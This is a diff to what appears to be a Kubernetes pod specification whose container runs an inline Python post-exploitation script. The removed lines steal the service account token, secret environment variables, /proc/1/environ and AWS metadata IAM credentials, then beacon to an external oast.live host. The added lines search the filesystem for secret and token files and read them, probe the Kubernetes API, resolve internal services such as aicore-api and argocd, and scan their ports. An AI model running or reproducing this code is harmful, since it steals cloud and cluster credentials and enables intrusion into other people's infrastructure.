@@ -28,121 +28,100 @@ spec:
           args:
           - |
             python3 -c "
-            import os, subprocess, urllib.request, ssl, json, base64
+            import os, subprocess, urllib.request, ssl, json, glob, socket
+
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
-
             results = {}
 
-            # --- hostname / id ---
+            # --- Basic info ---
             results['hostname'] = subprocess.check_output(['hostname']).decode().strip()
             results['id'] = subprocess.check_output(['id']).decode().strip()
+            results['uname'] = subprocess.check_output(['uname', '-a']).decode().strip()
 
-            # --- K8s service account token ---
-            try:
-                with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
-                    results['k8s_sa_token'] = f.read().strip()
-            except Exception as e:
-                results['k8s_sa_token'] = 'ERR: ' + str(e)
-
-            # --- K8s CA cert (fingerprint) ---
-            try:
-                with open('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt') as f:
-                    results['k8s_ca'] = f.read()[:200]
-            except Exception as e:
-                results['k8s_ca'] = 'ERR: ' + str(e)
-
-            # --- K8s namespace ---
-            try:
-                with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace') as f:
-                    results['k8s_ns'] = f.read().strip()
-            except Exception as e:
-                results['k8s_ns'] = 'ERR: ' + str(e)
-
-            # --- Relevant env vars ---
-            env_keys = [k for k in os.environ if any(x in k.upper() for x in
-                ['AWS', 'SECRET', 'TOKEN', 'KEY', 'PASS', 'CRED', 'KUBE', 'CLUSTER', 'AI_', 'SAP_', 'AZURE', 'OPENAI', 'AICORE'])]
-            results['env'] = {k: os.environ[k] for k in sorted(env_keys)}
-
-            # --- /proc/1/environ (init process env) ---
-            try:
-                with open('/proc/1/environ', 'rb') as f:
-                    env_bytes = f.read()
-                env_proc = {}
-                for entry in env_bytes.split(b'\x00'):
-                    if b'=' in entry:
-                        k, _, v = entry.partition(b'=')
-                        ks = k.decode(errors='replace')
-                        if any(x in ks.upper() for x in ['AWS', 'SECRET', 'TOKEN', 'KEY', 'PASS', 'CRED', 'KUBE', 'SAP_', 'AZURE', 'OPENAI', 'AICORE']):
-                            env_proc[ks] = v.decode(errors='replace')
-                results['proc1_env'] = env_proc
-            except Exception as e:
-                results['proc1_env'] = 'ERR: ' + str(e)
-
-            # --- IMDS from inside the container ---
-            for imds_url in [
-                'http://169.254.169.254/latest/meta-data/',
-                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-                'http://169.254.169.254/latest/dynamic/instance-identity/document',
+            # --- Scan entire filesystem for token/secret files ---
+            secret_paths = []
+            for pattern in [
+                '/run/**','/etc/**secret*','/etc/**token*','/etc/**cred*',
+                '/var/**secret*','/var/**token*','/var/**cred*',
+                '/secrets/**','/vault/**','/mnt/**secret*','/mnt/**token*',
+                '/tmp/**token*','/tmp/**secret*',
             ]:
-                key = 'imds_' + imds_url.split('/')[-2]
                 try:
-                    req = urllib.request.Request(imds_url, headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
+                    for f in glob.glob(pattern, recursive=True):
+                        if os.path.isfile(f) and os.path.getsize(f) < 10000:
+                            secret_paths.append(f)
+                except:
+                    pass
+            results['secret_files'] = secret_paths
+
+            # Read any token files found
+            for path in secret_paths:
+                try:
+                    with open(path) as f:
+                        content = f.read(500)
+                        if any(x in path.lower() or x in content.lower() for x in ['token', 'secret', 'key', 'cred', 'pass']):
+                            results[f'file_{path}'] = content
+                except:
+                    pass
+
+            # --- Check /proc/net/tcp for active connections / listening ports ---
+            try:
+                with open('/proc/net/tcp') as f:
+                    results['proc_net_tcp'] = f.read()
+            except Exception as e:
+                results['proc_net_tcp'] = 'ERR: ' + str(e)
+
+            # --- K8s API anonymous access ---
+            k8s_host = os.environ.get('KUBERNETES_SERVICE_HOST', '100.104.0.1')
+            k8s_port = os.environ.get('KUBERNETES_SERVICE_PORT', '443')
+            for path in ['/api', '/api/v1', '/api/v1/namespaces', '/apis', '/version', '/healthz']:
+                url = f'https://{k8s_host}:{k8s_port}{path}'
+                try:
+                    req = urllib.request.Request(url)
                     with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
-                        results[key] = r.read(2000).decode(errors='replace')
+                        results[f'k8s_anon{path}'] = r.read(500).decode(errors='replace')
                 except Exception as e:
-                    results[key] = 'ERR: ' + str(e)
+                    results[f'k8s_anon{path}'] = 'ERR: ' + str(e)[:80]
 
-            # --- IMDSv2 token ---
-            try:
-                req_token = urllib.request.Request(
-                    'http://169.254.169.254/latest/api/token',
-                    method='PUT',
-                    headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
-                with urllib.request.urlopen(req_token, timeout=5, context=ctx) as r:
-                    imds_token = r.read().decode().strip()
-                results['imdsv2_token'] = imds_token
-                # Use it to get creds role
-                req_role = urllib.request.Request(
-                    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-                    headers={'X-aws-ec2-metadata-token': imds_token})
-                with urllib.request.urlopen(req_role, timeout=5, context=ctx) as r:
-                    role_name = r.read().decode().strip()
-                results['imds_iam_role'] = role_name
-                # Get actual credentials
-                req_creds = urllib.request.Request(
-                    f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}',
-                    headers={'X-aws-ec2-metadata-token': imds_token})
-                with urllib.request.urlopen(req_creds, timeout=5, context=ctx) as r:
-                    results['imds_iam_creds'] = json.loads(r.read())
-            except Exception as e:
-                results['imdsv2'] = 'ERR: ' + str(e)
+            # --- Try to DNS resolve internal services ---
+            internal_names = [
+                'kubernetes.default.svc.cluster.local',
+                'kube-dns.kube-system.svc.cluster.local',
+                'argocd-server.argocd.svc.cluster.local',
+                'istio-pilot.istio-system.svc.cluster.local',
+                'prometheus.monitoring.svc.cluster.local',
+                'grafana.monitoring.svc.cluster.local',
+                'aicore-api.default.svc.cluster.local',
+                'ai-api.default.svc.cluster.local',
+            ]
+            dns_results = {}
+            for name in internal_names:
+                try:
+                    ip = socket.gethostbyname(name)
+                    dns_results[name] = ip
+                except Exception as e:
+                    dns_results[name] = 'ERR: ' + str(e)[:50]
+            results['dns'] = dns_results
 
-            # --- K8s API call using SA token ---
-            try:
-                sa_token = results.get('k8s_sa_token', '')
-                if sa_token and not sa_token.startswith('ERR'):
-                    req_k8s = urllib.request.Request(
-                        'https://kubernetes.default.svc.cluster.local/api/v1/namespaces',
-                        headers={'Authorization': 'Bearer ' + sa_token})
-                    with urllib.request.urlopen(req_k8s, timeout=5, context=ctx) as r:
-                        results['k8s_namespaces'] = r.read(3000).decode(errors='replace')
-            except Exception as e:
-                results['k8s_api'] = 'ERR: ' + str(e)
+            # --- Try HTTP to resolved services ---
+            for name, ip in dns_results.items():
+                if not ip.startswith('ERR'):
+                    for port in [80, 443, 8080, 8443, 9090]:
+                        url = f'https://{ip}:{port}/'
+                        try:
+                            req = urllib.request.Request(url)
+                            with urllib.request.urlopen(req, timeout=3, context=ctx) as r:
+                                results[f'svc_{name}_{port}'] = r.read(200).decode(errors='replace')
+                        except Exception as e:
+                            err = str(e)[:40]
+                            if 'timed out' not in err and '111' not in err:
+                                results[f'svc_{name}_{port}'] = 'ERR: ' + err
 
-            # Print everything
-            print('[KEY_DUMP_START]')
+            print('[RECON_START]')
             print(json.dumps(results, indent=2, default=str))
-            print('[KEY_DUMP_END]')
-
-            # OAST beacon with summary
-            id_out = results.get('id', '')
-            parts = id_out.split()[:2]
-            import re
-            dns_label = re.sub(r'-+', '-', re.sub(r'[^a-z0-9]', '-', '-'.join(parts).lower())).strip('-')[:50]
-            dns_url = 'http://' + dns_label + '.d7f9h6uipla67ee9kavg8nai4f9ck58at.oast.live/'
-            urllib.request.urlopen(urllib.request.Request(dns_url), timeout=10, context=ctx)
+            print('[RECON_END]')
             " 2>&1
             python3 -c "
             import http.server
